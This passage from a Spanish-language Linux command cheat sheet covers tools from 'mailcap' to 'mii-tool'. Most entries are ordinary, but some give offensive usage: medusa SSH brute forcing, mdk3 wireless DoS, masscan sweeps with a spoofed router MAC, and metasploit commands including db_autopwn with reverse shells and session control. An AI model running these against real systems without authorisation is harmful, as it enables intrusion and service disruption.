        d* (Borra todos los mensajes)
	? (listado de comandos disponibles)
	7 (muestra el mensaje 7)
	h (muestra la lista de mensajes)
	h 4 (muestra la lista de mensajes comenzando en el 4)
	q (sale de mail)


mailcap
Se usa para definir cómo los programas manejan diferentes tipos de archivos MIME. Básicamente, utiliza un archivo de configuración, generalmente ubicado en /etc/mailcap o en el directorio del usuario, ~/.mailcap, para mapear tipos MIME a programas específicos que se deben utilizar para visualizar, editar o manipular esos archivos.
$ cat /etc/mailcap (lista de qué programa debe ejecutarse cuando se encuentra un tipo MIME particular)
Por ejemplo, supongamos que se quiere configurar el tipo MIME text/html para que se abra con el navegador de texto lynx:
$ nano ~/.mailcap
Y colocar la linea:
  text/html; lynx %s"
$ run-mailcap file.html (El sistema detectará que es un archivo text/html y lo abrirá con el programa asociado, en este caso lynx)
Si quisiéramos abrir los pdf con evince:
$ nano ~/.mailcap
Y poner la linea:
  application/pdf; evince %s
Si luego lanzáramos:
$ run-mailcap documento.pdf
El documento se abriria con evince
Si se quiere añadir instrucciones más complejas. Por ejemplo, que los archivos de imagen image/jpeg se abran con feh, pero también definir opciones adicionales:
$ nano ~/.mailcap
Y poner la linea:
image/jpeg; feh --auto-zoom --borderless %s
$ run-mailcap --test (verificar que el archivo mailcap está correctamente configurado)


mailutil
Utilidades relacionadas con el correo
$ mailutil transfer {imap.gmail.com/ssl/user=usuario@gmail.com} Gmail/ -v (hacer copia de seguridad de los correos de gmail)


mailx
Programa para enviar y recibir correo (versión mejorada de 'mail' en Unix).
	$ mailx -s "pruebas" usuario@gmail.com
	Cc otro_correo@gmail.com
	Cuerpo del texto del correo
Ctrl D (para envio)
$ mailx -s "un adjunto" usuario@gmail.com < texto_para_enviar.txt (enviar un adjunto)


maim
Capturas de pantalla del escritorio.
$ maim captura.png (forma básica)
$ maim --select captura.png (seleccionar región)


maint-guide
Este paquete contiene la Guía para nuevos mantenedores de Debian. Este documento intenta describir la construcción de un paquete Debian para usuarios comunes y potenciales de Debian. Utiliza un lenguaje bastante no técnico y está bien cubierto con ejemplos prácticos. En el navegador abrir la url /usr/share/doc/maint-guide-ca/html/index.ca.html


makeinfo
Compilar archivos texinfo a distintos formatos.
$ makeinfo --html archivo.texi (a html)
$ makeinfo --pdf archivo.texi


makepasswd
Crea contraseñas aleatorias usando /dev/urandom.
$ makepasswd --count=5 --chars=12 (5 y de 12 caracteres)
$ makepasswd --count=5 --chars=12 --count=5 --crypt (y cifrar el resultado de cada una de ellas. Otra opcion es crypt-md5)


makepkg
Script para automatizar la construcción de paquetes para Archlinux.
# makepkg --asroot (Lanzado en el interior del directorio donde se encuentra el PKGBUILD, crea el paquete .pkg.tar.xz, instalable con pacman -U)
# makepkg --asroot --source (Lanzado en el interior del directorio donde se encuentra al PKGBUILD, crea el paquete .src.tar.gz listo para subir a AUR)
# makepkg --asroot -g paquete (Muestra el md5sum)


maldet
Detector de malware.
# maldet -a /home/usuario
# maldet -m /home/user1,/home/user2
# maldet -u (Acualización de firmas de detección de malware desde rfxn.com)
# maldet –report (Muestra el último reporte)


man
Muestra la página del manual de un comando o aplicación.
$ man -L es comando (especificando idioma si disponible)
$ man -k permissions (Busca comandos que traten sobre “permissions”)
$ man -k vnc ssh (Buscar sobre dos comandos)
$ man -t ls > ls.pdf (Formateado para salida pdf)
$ man -t ls | ps2pdf -&gt; /home/usuario/ls.pdf (Lo mismo)
$ man 2 read (Especificando la sección del manual. Por defecto la 1)
Secciones:
Sección 1: Comandos generales
Sección 2: Llamadas a sistema
Sección 3: Funciones (programación en C)
Sección 4: Ficheros especiales
Sección 5: Formatos de fichero y convenciones
Sección 6: Juegos
Sección 7: Convenciones y otros
Sección 8: Comandos privilegiados y de administración
Algunas teclas de control:
	Ctrl + f (Avanza una página)
	Crrl + b (Retrocede una página)
	/palabra (Busca “palabra” en el texto hacia adelante)
	?palabra (Busca “palabra” en el texto hacia atrás)
	n (Elemento siguiente en la busqueda)
	N (Elemento previo en la busqueda)
	q (Salir)
Nota.- Normalmente "man" formatea el contenido para que coincida con el ancho del terminal. Redirige su salida a una tubería, que no tiene "ancho de pantalla", por lo tanto, formatea utilizando el ancho predeterminado de 80 caracteres. Algunas páginas de manual tienen tablas de más de 80 caracteres de ancho, por lo que aparece esta advertencia de "no se puede romper la línea".
       <standard input>:602: warning [p 7, 11.3i, div 'an-div', 0.2i]: cannot adjust line
Para solucionarlo:
$ MANWIDTH=1250 man $COMANDO | wc -l
1- Para crear una página man a partir de un .md:
$ pandoc archivo.md -s -t man -o archivo.1
# mv archivo.1 /usr/local/share/man/ca/man1/ (si no estan los directorios "ca/man1" se crean)


man2html
Pasar páginas de manual a formato html. Tambien pueden visualizarse con el navegador con http://localhost/cgi-bin/man/man2html.
$ man ls | man2html > man_ls.html


man2web
Pasar páginas del manual a formato html.
$ man2web ifconfig > ifconfig.html


manpage-alert
Comprobar ejecutables sin página de manual.
$ manpage-alert -p (por su nombre)
$ manpage-alert -f (sin texto principal)


manpages-es
Este paquete contiene páginas de manual traducidas al español. Las traducciones exactas y las páginas del manual pueden cambiar de una versión a otra de un comando a una app, por tanto pueden no corresponder a la versión actual. El paquete contienen páginas de manual adicionales que aún no se han traducido.


manpath
Busca la ruta de las páginas man.
$ manpath -g (todas las rutas globales dentro del archivo de configuración)


manswitch
Busca un flag concreto en las páginas man.
$ manswitch ps -a
$ manswitch uname -r


mapscii
google maps en la terminal. Descargar node de <https://nodejs.org/en/> y una vez descomprimido colocarlo en opt, crear un enlace a su ejecutable e instalar el paquete:
	# mv node-v6.10.3-linux-x64 /opt
	# ln -s /opt/node-v6.10.3-linux-x64/bin/npm /usr/bin/
	# npm install -g mapscii
$ mapscii (abre el mapa mundial)
Teclas:
	las flechas (para mover derecha, izquierda, arriba y abajo)
	a (Acercar el zoom)
	z (alejar el zoom)
Nota.- Tambien puede ejecutarse en una terminal sin instalar nada tecleando: telnet mapscii.me y usando las mismas teclas.


markdown
Lenguaje orientado a la escritura de documentos de manera que sean fáciles de escribir y leer directamente en texto plano convirtiéndolos en documentos XHTML bien formados. La aplicación retext permite eleborar textos en markdown y visualizarlos en tiempo real.
Sintaxis elemental [las referencias son respecto de html]:
Notas: Cada signo afecta hasta el primer salto de linea. Un bloque HTML ha de estar precedido por una linea en blanco y con una sangría de 4 espacios y en su interior no actúa la sintaxis markdown. Para escapar un carácter se precede barra [\\] . Los párrafos se delimitan con lineas en blanco.
	# (equivalente a H1. Mismo resultado subrayando el texto con el signo = en la linea inmediata inferior)
	## (equivalente a H2. Mismo resultado que subrayando el texto con el signo - en la linea inmediata inferior)
	> (muestra el texto que sigue como una cita)
	* (Mostrará como una lista no ordenada)
	1. (Mostrará como una lista ordenada)
	**texto** (texto entre dos pares de asteriscos: en negrita)
	*texto* (texto entre asteriscos: en cursiva)
	***texto*** (Texto entre dos trios de asteriscos: negrita y cursiva)
	2 espacios al final de una linea fuera salto de linea
	<URL> (Modo de colocar un enlace. Igual para un email)
	--- (3 guiones muestran una linea)
	[nombre del enlace](http://url "nombre que aparece al colocar el cursor") (Enlace a una URL. El entrecomillado es opcional)
	Ejemplo: Puedes buscar en \[google](http://google.es "google") o en \[yahoo](http://es.yahoo.com "yahoo")
	![imagen](http://url "nombre que aparece al colocar el cursor")
	Ejemplo: !\[Herramientas](http://www.linux-mag.com/s/i/topics/toolbox.jpg "Caja de herramientas")
	<img class="[clases asignadas]" src="/ruta/a/la/imagen" title="[ancho] [alto] [el title [alt de la imagen]]" > (Colocar una imagen)


masscan
Escaner de puertos. Produce resultados similares a "Nmap". Tiene permanentemente activada las siguientes opciones: "-sS" realiza un escaneo de tipo TCP SYN, "-Pn" trata todos los hosts como si estuviesen en funcionamiento, "-n" no hace una resolución al DNS, "--randomize-hosts" aplica aleatoriedad al orden de los host a escanear, "-v" genera verbosidad y la opción "--send-eth" utiliza para el envío paquetes ethernet en bruto.
# masscan --regress (autotest integrado)
# masscan 192.168.1.0/24 -p80,443 (escanea los puertos 80 y 443 en toda la red))
# masscan 192.168.1.0/24 -p22-150 (escanea el rango de puertos del 22 al 150)
# masscan 192.168.1.0/16 -p80 --rate 10000 --router-mac 66-55-44-33-22-11 (escaneando un pueto de una red con una MAC falsa del router para no salir a internet y enviardo 10000 pàquetes por segundo)
# masscan 192.168.1.0/16 ‐‐top-ports 100 > escaner.txt (escanear los 100 puertos más comunes según nmap y guardarlo en el archivo escaner.txt)
# masscan 192.168.1.5 -p0-65535 --rate 1000000 (escanear todos los puertos de una IP))
# masscan -p80 --banners 0.0.0.0/24 (obtener los baners de todas las ips de una red con el puerto abierto 80)


match_parens
Encontrar en textos paréntesis, llaves, corchetes, comillas, etc desparejados.
$ match_parens --test texto.txt


mate-screensaver-command
Mismas opciones que gnome-screensaver-command [ver].


maybe
[python-ptrace]. Ejecuta un script validando sus funciones y simulando su ejecución cuando en realidad no se està ejecutando.
$ maybe script.sh


mbmon
Monitorea las temperaturas, voltajes y rpm de ventiladores de refrigeración de la cpu.
# mbmon -c2 (realizar dos monitoreos y salir)
# mbmon -t -u -n (informando de la hora, el sistema y el hostname)


mbw
Determina el ancho de banda de la memoria de "copia" disponible para los programas del espacio de usuario.
$ mbw 1000 (tamaño de la matriz para las pruebas de 1000 [ARRAY_SIZE])
$ mbw -a -n 2 1000 (dos números por prueba con 1 G de memoria y no mostrar promedio [-a])
$ mbw -t 1 -n 3 1000 (3 ejecuciones por prueba y solo en la DUMB ["-t 0" para la MEMCY y "-t 2" para la MCBLOCK)
mbw proporcionará tres métricas principales en los resultados:
     MEMCPY: Mide el ancho de banda de la memoria al copiar datos utilizando la función memcpy estándar.
     DUMB: Mide el ancho de banda de la memoria mediante un bucle simple para copiar datos.
     MCBLOCK: Mide el ancho de banda de la memoria utilizando funciones de memoria con tamaños de bloque específicos.
Más o menos los resultados pueden ser:
    ...
    Method: MEMCPY	Elapsed: 0.20857	MiB: 1000.00000	Copy: 4794.588 MiB/s
    ...
    Method: DUMB	Elapsed: 0.14374	MiB: 1000.00000	Copy: 6956.909 MiB/s
    ...
    Method: MCBLOCK	Elapsed: 0.09181	MiB: 1000.00000	Copy: 10892.356 MiB/s


mc
Gestor de archivos. La pantalla de Midnight Commander está divida en cuatro partes. La mayor parte de la pantalla está ocupada por los dos paneles de directorio. Por defecto, la segunda línea inferior de la pantalla es la línea de órdenes del sistema y la línea inferior muestra las etiquetas de las teclas de función. La línea superior es la barra de menú que si no está visible puede verse pulsando F9. MC pone a la vista dos directorios al mismo tiempo. Uno de los paneles es el panel actual. Algunas operaciones con archivos como Renombrar y Copiar utilizan por defecto el directorio del panel no seleccionado como destino, pero siempre solicitan una confirmación previa y podemos cambiarlo. Podemos ejecutar comandos del sistema desde MC simplemente escribiéndolos. Todo lo que escribamos aparecerá en la línea de órdenes del sistema y cuando pulsemos Intro, Midnight Commander ejecutará estos comandos. Si tenemos el ratón activado [ver gpm] para seleccionar texto mantener pulsada la tecla Mayúsculas mientras se selecciona.
$ mc -S gotar.ini /media/servidor /home/usuario (Especificando un skin [Listado en /usr/share/mc/skins] y directorio de cada panel)
Colocando la linea como alias en .bashrc arancará siempre con esta configuración inicial:
$ nano .bashrc
alias mc='mc -S gotar.ini /media/servidor /home/usuario'
Algunas teclas de control:
	F1 (Despliega el Menú de ayuda)
	F3 (Activa el Visor de archivos interno)
	F4 (Ejecuta el Editor interno)
	F5 (Copiar archivos)
	F6 (Mover archivos)
	F7 (Crear carpeta)
	F8 (Borrar archivos)
	F9 (Activa el menú principal desplegable)
	F10 (Salir de mc)
	Tab (Moverse entre los paneles)
	Insert (Marcar para operaciones con múltiples archivos)
	Supr (Eliminar archivo)
	Flechas de desplazamiento (Permiten moverse por menús y submenús)
	Alt-Enter (copiar el nombre de un archivo en la línea de comandos [cp o mv])
	Alt-Tab (misma función que la tecla TAB en el shell [completar comando o ruta tras haber escrito sus primeras letras]
	Alt-p (Retrocede por el historico de comandos)
	Alt-n (Avanza por el historico de comandos)
	Alt-h (Abre una ventana con el historico de comandos)
1.-
Mas personalizaciones de los colores:
Colores posibles: white, gray, blue, green, yellow, magenta, cyan, red, brown, birghtgreen, brightblue, brightmagenta, brightcyan, brightred, lightgray, default
Se puede incidir en los siguientes aspectos de los grupos:
	Base colors: normal, selected, marked, markselect, errors, input, reverse, gauge
	Menu colors: menu, menusel, menuhot, menuhotsel
	Dialog colors: dnormal, dfocus, dhotnormal, dhotfocus
	Help colors: helpnormal, helpitalic, helpbold, helplink, helpslink
	Viewer color: viewunderline
	Special highlighting colors: executable, directory, link, stalelink, device, special, core
	Editor colors: editnormal, editbold, editmarked
Nota.- No tienen que definirse obligatoriamente todos los subgrupos
Para pruebas:
	$ mc --colors normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default
Para dejar la seleccion permanente crear en el directorio (Si no existe se crea):
$ nano .moc/ini
Y pegar:
	[colors]
normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default
Si lo queremos como alias:
$ nano .bashrc
Y pegamos:
	alias mc="mc --colors normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default"
2.-
Para configurar las aplicaciones que se usarán por defecto:
$ cp /etc/mc/mc.ext .mc/bindings
$ nano .moc/bindings
Y modificar las que procedan. Ejemplo:
	# Para abrir los txt com vi
		shell/.txt
        	Open=%var{EDITOR:vi} %f
	# Que los videos los abra vlc
		include/video
        	Open=(vlc %f >/dev/null 2>&1 &)


mcfly
Reemplaza la búsqueda predeterminada en el historial. Una vez instalado, abriendo un terminal y tecleando Ctrl-r abre un motor de búsqueda inteligente que tiene en cuenta el directorio de trabajo y el contexto de los comandos ejecutados recientemente. Las sugerencias de McFly se priorizan en tiempo real. Añadir a archivo:
$ nano ~/.bashrc
La linea:
eval "$(mcfly init bash)"


mcookie
Genera números hexadecimales de 128 bits aleatorios.
$ mcookie


mcp
[mmv)]. Permite hacer copias de varios ficheros.
$ mcp ";*.png" "#1#2.png.bak" (Realizará un .png.bak de todos los .png que encuentre en el presente directorio y sus subdirectorios)


mcrypt
Cifrar achivos
$ mcrypt archivo   (cifrar)
$ mcrypt -u archivo  (elimina el archivo inicial despues del cifrado)
$ mdecrypt archivo.nc  (descifrar)
$ mcrypt --d archivo.nc   (descifrar)
$ mcrypt --list   (ver lista de algoritmos usables)
$ mcrypt -a rijndael-256 ecb archivo  (cifrar especificando un algoritmo)
$ mcrypt -p archivo    (usando compresión bzip2 antes de la encriptación)
$ mcrypt -b archivo   (No mantener información del algoritmo usado en el cifrado)


md2term
Ver presentaciones de markdown para textos cortos de menos de 30 líneas y, al mismo tiempo, poder visualizarse con otras presentaciones en sitios web como GitHub, GitLab, etc. El script también se puede utilizar satisfactoriamente para ver otros textos de markdown, siempre que se respeten sus limitaciones.
$ md2term -k 1 -p -f file.md (manteniendo todas las marcas [-k 0 sin mantenerlas, -k2 solo para el titulo], aplicando "less" del archivo epecificado)


md5sum
Escribe o comprueba sumas de verificación md5
$ md5sum archivo
$ md5sum -  (Entra en el prompt. Teclear la palabra o frase y pulsar dos veces Ctrl+d)
$ echo -n palabra | md5sum | awk '{print $1}' (md5sum de una palabra)


mdadm
Gestión de raids.
# mdadm --create --verbose /dev/md0 --level=1 --raid-devices=2 /dev/sdb1 /dev/sdc1
--create (Para crear el raid)
--verbose (No pregunte)
/dev/md0 (Dispositivo dónde vamos a crear el raid)
--level=1 (Nivel 1 del RAID [dos discos uno espejo del otro)
--raid-devices=2 (Número de dispositivos)
/dev/sdb1 /dev/sdc1 (los dispositivos que vamos a usar)


mdetect
Herramienta para configurar automáticamente mouses
$ mdetect -v


mdf2iso
Convertir imágenes MDF a ISO
$ mdf2iso archivo.mdf archivo.iso


mdk3
Herramienta de ataque para redes IEEE 802.11
# mdk3 wlan0 a (Utilizar la interfaz wireless [wlan0] para ejecutar un test DoS [a])


mdm
Gestor de sesión del proyecto MATE. El archivo de configuración en:
# nano /etc/mdm/mdm.conf
Seleccionar un tema de los disponibles en /usr/share/mdm/themes/:
GraphicalTheme= XXXXX
Entrada automática:
[daemon]
AutomaticLoginEnable=true
AutomaticLogin=USUARIO


mdns-scan
Herramienta para buscar servicios mDNS/DNS-SD publicados en la red local. Recupera una lista de todos los servicios registrados en el enlace local.
$ mdns-scan


mdp
Presentaciones con terminal en markdown.
$ mdp presentacion.mdp (arrancar la presentación)
Sintaxis de la presentación
	-> # El título de la diapositiva <-
	-> Subtitulo <-
	*_Otra forma de subtitular_*
	> Palabra precedida del signo > muestra como una cita
	* Palabras o frases precesidas por asterisco crean una lista
	1. Palabras precedidas por numeros con punto crean lista
	*texto marcado de color*
	*_texto marcado de color y subrayado_*
	[google](http://google.es)
	--- (Con 3 guiones termina la diapositiva para pasar a la siguiente)
	# otra forma de colocar titulo
	Otro titulo (texto subrayado)
	----------
	`lista anidada`
	- *Distros*
    	- Las mejores
        	- Debian
        	- Arch
        	- Ubuntu
        	- Mint
    	- Las peores
        	- ventanas
        	- manzanas comidas
	texto tabulado para marcar codigo


mech-dump
Muestra información sobre una página web.
$ mech-dump --all URL (toda)
$ mech-dump --headers URL (cabeceras)
$ mech-dump --links (de todos los enlaces)


mediainfo
Utilidad que se utiliza para recuperar información técnica y otros metadatos sobre archivos de audio o vídeo.
$ mediainfo -f archivo.mp3 (con la máxima información)
$ mediainfo --Output=HTML archivo.wav > archivo.html (volcar la información a un archivo html para abrir con el navegador)


medusa
Herramienta para ataques de fuerza bruta contra un variado conjunto de protocolos.
# medusa -d  (módulos disponibles)
# medusa -h 127.0.0.1 -u usuario -P wordlist -M ssh
opciones:
-h host (Especificar un host)
-H file (Especificar un fichero con un listado de hosts)
-u username (Especificar el usuario)
-U file	 (Especificar un listado de usuarios)
-p password (especificar una contraseña a probar)
-P file	 (indicamos un diccionario de contraseñas)
-M module (Especificar un módulo de los disponibles)


melt
Editor de video y reproductor de audio.
$ melt video.mp4
$ melt audio.wav


members
Muestra los miembros del grupo especificado.
$ members -a grupo  (todos sus miembros)
$ members -p grupo  (el usuario primario)
$ members -s grupo  (los secundarios)


memoria
Liberar memória física
# echo 3 > /proc/sys/vm/drop_caches


memstat
Enumera todos los procesos, ejecutables y bibliotecas compartidas que están consumiendo memoria virtual.
$ memstat -v
$ memstat -p PID


memtest86
[memtest86+]. Software diseñado para encontrar problemas que pueden afectar a los módulos de memoria RAM del equipo. La aplicación requiere iniciarse independiente del sistema operativo y consiste en escribir una serie de datos con 9 patrones de escritura distintos a la totalidad de direcciones de la memoria RAM. Una vez realizada la escritura se leerá el contenido escrito en la memoria RAM y se comprobará que sea el mismo que el contenido original. La duración del test es infinita y por lo tanto deberemos ser nosotros mismos cuando decidimos pararlo, o sea que cada "pasada" significa escribir y leer los 9 patrones de escritura distintos una vez. Si se realizan 3 "pasadas" significa repetir el test completo 3 veces. Si no se desactiva la opción se encuentra en el gestor de arranque grub [ver]


memtester
Utilidad para probar el subsistema de memoria en busca de fallas.
$ memtester 10 2 (con 10 MB y 2 bucles)


memusage
Perfila el uso de memoria de un programa mientras se está ejecutando.
$ memusage -p imagen script.sh (crear un gráfico con la salida del script.sh)


mencal
Calendario de ciclos menstruales. El archivo de configuración si no lo crea la misma aplicación despues de lanzarse con los datos de la opción -c. Puede configurarse personalmente editando el archivo:
$ nano ~/.mencalrc
  length 28
  duration 4
  name periodo
  color yellow
$ mencal -m -3 (calendario empieza el lunes, mostrar 3 meses)
$ mencal -m -y (que muestre todo el año actual)
$ mencal -m -y 2025 (el año especificado)
$ mencal -m -3 -c s=20231101,l=28,d=4,n=periodo,f=~/.mencalrc,c=yellow (sin archivo de configuración)


mencoder
Procesador de video.
$ mencoder mf://*.jpg -ovc lavc -o out.avi (Crear un video de las imágenes de un directorio)
$ mencoder "mf://*.jpg" -mf fps=0.5 -vf scale=480:360 -o output.avi -ovc lavc -lavcopts vcodec=mpeg4  (Hacer video avi con imagenes jpg mostrando foto cada 2 segundos)
fps=0.5  (cada 2 segundos)
fps=0.25  (cada 4 segundos)
$ mencoder video.avi -sub subtitulos.srt -oac copy -ovc lavc -o resultado_final.avi -subcp latin1 -font /usr/share/fonts/TTF/arial.ttf -subfont-text-scale 2.8  (pegar subtítulos- *.srt- a un video- *.avi- especificando la fuente de letras y la medida)
$ mencoder input.flv -ovc lavc -oac mp3lame -o output.avi  (convertir flv a avi)
$ mencoder -idx video_corrupto.avi -ovc copy -oac copy -o video_reparado.avi (Reconstruir un video dañado)
$ mencoder -endpos 00:00:23 -ovc copy -oac copy entrada.avi -o salida.avi (Guardar los primeros 23 segundos de un video)
$ mencoder -ss 00:00:02 -oac copy -ovc copy entrada.avi -o salida.avi (desechar los primeros 2 segundos de un video)
$ mencoder -ss 00:00:10 -endpos 00:02:20 -oac pcm -ovc raw entrada.mkv -o salida.mkv (cortar desde los 10 segundos a los 2,20 minutos de un video con los codecs especificados [pcm y raw]))
$ mencoder -oac copy -ovc copy -o resultado.avi *.avi (Unir todos los .avi de un directorio en un video "resultado.avi")
	-ovc copy (Se utilizará la misma codificación de video que en el original)
	-oac copy (Se utilizará la misma codificación de audio que en el original)


mesg
Controla el acceso a la terminal por otros usuarios. Se utiliza para permitir o rechazar que otros usuarios escriban mensajes a la propia terminal
$ mesg y   (autoriza)
$ mesg n   (desautoriza)


messages
Contar el número de mensajes del buzón.
        # messages
        Number of messages in /var/mail/root: 31


metacaracteres
Permiten ampliar comandos o combinar varios para construir una única orden lógica. Son varios: la tuberia [|], redirección [<>], el asterisco [*], la tilde [~], el simbolo dolar [$], el circunflejo [^], el interrogante [?], la almoadilla [#], los corchetes [[]], parentesis [()], llaves [{}], arroba [@]...
$ date ; who (semicolon-punto y coma [;] es un separador entre ordenes que se ejecutan secuencialmente)
$ date | wc -m (pipe-tuberia [|] mandar la salida de un comando a otro)
$ date \ (Backslash-barra inversa [\] posibiita escribir ordenes en la siguiente linea)
> | wc -m
$ ls \*textos*/ (tambien permite escapar un carácter. Por ejemplo listara el directorio llamado *textos-largos)
$ (date | who) | wc (parentesis [()] aislan ordenes separadas por punto y coma o tuberia y se ejecutan como una única orden)
$ ls {*txt,*sh} (llaves [{}] Crea un bloque de código ejecutado en el propio interprete. Listará todos los .txt y .sh)
$ htop & (Ampersand-et [&] Indica que ejecuta un trabajo en segundo plano [background] liberando la terminal donde se ha lanzado)
  $ jobs
  [1]+  Aturat                  htop
  $ %1
  htop
$ ld || date (OR [||] Sólo se ejecuta la siguiente orden si la primera falla)
$ ld && date (AND [&&] Sólo se ejecuta la siguiente orden si la primera tiene exito)
$ date > ~/fecha.txt (redirigir la salida del comando date a un archivo [>] en el directorio del usuario [~])
$ ls | grep png$ (dolar [$] buscar los archivos que terminan con png)
$ ls | grep ^c (caret-circunflejo [^] buscar los que empiezan por c)
$ ls | grep ??? (interrogante [?] substituye un coracter, por tanto en el ejemplo buscar los archivos con 3 caracteres)
Nota.- Algunos metacaracteres, según el contexto, pueden tener otros significados. Por ejemplo el dolar [$] puede referirse a una funcion:
$ echo $HOME


metacity
gestor de ventanas
$ metacity --replace (activar metacity)


metapixel
Generar mosaicos de fotos [collage].
$ mkdir collage (Crear el directorio)
$ metapixel-prepare --width=10 --height=10 -r Imatges/ collage (Copiar con las medidas introducidas [width y height] desde el directorio de imágenes de forma recursiva [-r] al directorio creado)
$ metapixel --metapixel Imagenes/imagen.jpeg destino.jpg --library collage/ (Que coja la imágen.jpg del directorio Imagenes y la convierta en destino.jpg usando el directorio "collage")


metasploit
Herramienta utilizada para realizar pentesting, tanto para comprometer sistemas como para obtener datos antes y después de comprometerlo. Los módulos auxiliares se pueden usar para el escaneo de puertos, la identificación del servicio, el rastreo de contraseñas y la enumeración de parches. Para empezar es necesario tener activado el servicio postgresql, crear la configuración inicial y luego iniciar Metasploit Framework:
# service postgresql start
$ msfd
# msfconsole (crea la base de datos en /home/usuario/.msf4/db)
Cada exploit tiene uno de siete posible rangos; excelente (mejor elección), grandioso, bueno, normal, promedio, bajo, y manual (peor elección). Un rango bajo del exploit, implica la probabilidad de causar algún daño en el objetivo, o no estar en la capacidad de entregar el payload seleccionado. Unos comandos básicos:
msf6 > help show (mostrar los parámetros disponibles para el comando show)
msf6 > show exploits (Mostrar todos los exploits del Framework)
msf6 > show payloads (Mostrar todos los payloads del Framework)
msf6 > show targets (lista de sistemas operativos que son vulnerables al exploit seleccionado)
msf6 > set payload nom_paylo (cargar un payload especifico)
msf6 > show auxiliary (Mostrar todos los módulos auxiliares del Framework)
msf6 > help search (búsqueda con exploits con palabras clave)
msf6 > search name:2018 (buscar módulos con un ID de NAME de 2018)
msf6 > search nom_explo (Búsqueda por nombre del exploit)
msf6 > search localhost (encontrar herramientas relacionadas con localhost)
msf6 > search type:[exploit, payload, auxiliary, encoder, post] [nom_explo] (Búsqueda por tipo y nombre del exploit)
msf6 > use nom_explo (Carga el exploit indicado)
msf6 > show options (Muestra las opciones de un exploit)
msf6 > info (Muestra información acerca de un exploit cargado)
msf6 > set RHOSTS 192.168.154.0/24 (asignar valor a las variables)
msf6 > set SRVPORT 80 (asignar puerto)
msf6 > run (realizar la ejecución del módulo/auxiliary cargado)
msf6 > back (salir del exploit que se está usando)
msf6 > connect 192.168.1.34 23 (conectar a un host)
msf6 > jobs (Se trata de módulos que se encuentran en ejecución en segundo plano. Permite listar y terminar trabajos existentes.
msf6 > connect -s 192.168.1.34 22 (conectar con SSL a un host por el puerto 22)
msf6 > load -l (listar los plugins disponibles)
msf6 > load Plugin (cargar un plugin del listado anterior)
msf6 > unload Plugin (descargar el plugin)
msf6 > show encoders (mostrar codificadores compatibles)
msf6 > use exploit/windows/http/struts2_rest_xstream (usar un exploit concreto)
msf6 > sessions -l (ver sesiones activas)
msf6 > sessions -l -v (Muestra la lista de sesiones disponibles en modo verbose)
msf6 > sessions -i <session-id> (entrar en una sesión específica)
msf6 > sessions -i 1 (interactuar con la primera sesión)
msf6 > sessions -s script (Ejecuta un script específico en todas las sesiones activas)
msf6 > sessions -K (Mata todas las sesiones activas)
msf6 > sessions -c cmd (Ejecuta un comando en todas las sesiones activas)
msf6 > exploit -j (Ejecuta un exploit en background)
msf6 > exploit -z (No interactúa con la sesión después de acceder con éxito)
msf6 > exploit -e encoder (Especifica el encoder a usar con el payload)
msf6 > exploit -h (Muestra la ayuda para el exploit especificado)
msf6 > db_create nombre (Crea una base de datos)
msf6 > db_connect nombre (Crea y se conecta a una base de datos)
msf6 > db_nmap (Usa y carga los resultados de Nmap en una base de datos)
msf6 > db_autopwn -h (Muestra la ayuda para usar db_autopwn)
msf6 > db_autopwn -p -r -e (Ejecuta db_autopwn contra todos los puertos encontrados, usa una shell reversa y los explota)
msf6 > db_destroy (Elimina la actual base de datos)
msf6 > db_destroy usuario:contraseña@host:puerto/base_de_datos (Borra una base de datos concreta)
msf6 > db_status (Verificar el estado operativo de la base de datos)
msf6 > hosts (todos los hosts registrados en la base de datos)
msf6 > services (enumerar los servicios registrados en la base de datos)
msf6 > vulns (Detallar todas las vulnerabilidades registradas en la base de datos)
msf6 > upload ./localpath/data.txt C:\Temp\data.txt (transferir un archivo local al remoto)
msf6 > download C:\Temp\data.txt ./localpath/data.txt (descargar un archivo del remoto a local)
msf6 > exit (salir de metasploit)
# msfupdate (actualizar la base de datos de exploits)


mgen
Ofrece la capacidad de realizar pruebas y mediciones de rendimiento de la red IP utilizando el tráfico TCP y UDP/IP. Los mensajes de prueba se pueden generar, recibir y registrar. mgen ofrece control sobre todos los parámetros de red y la sincronización de estos mensajes. Información: https://github.com/USNavalResearchLaboratory/mgen/blob/master/doc/mgen.pdf


mi
muestra información sobre los dispositivos montados [dispositivo de bloques, punto de montaje, opciones de montaje y sistema de ficheros utilizado]. Ver di
$ mi


microfono
(activar micro del monitor).
# gedit /etc/modprobe.d/alsa-base.conf
Añadir:
options snd_hda_intel model=laptop options snd-hda-intel position_fix=1 enable=yes
Reiniciar


midori
Navegador web. Los archivos de configuración en .config/midori/
1.-
Añadir buscadores:
En el desplegable "Añadir motores de búsqueda" colocar el nombre y en "comando" (en el ejemplo duckduckgo):
https://duckduckgo.com/?q=%s


migrate-pubring-from-classic-gpg
Migra el formato de llavero "clásico" de contraseñas pubring.gpg al formato de llavero "moderno", utilizado en las versiones 2.1 o 2.2 de GnuPG, pubring.kbx. Especificando --default se selecciona el directorio de inicio estándar de GnuPG  ~/.gnupg.
# migrate-pubring-from-classic-gpg --default


mii-tool
Muestra información similar a ethtool (Ver)
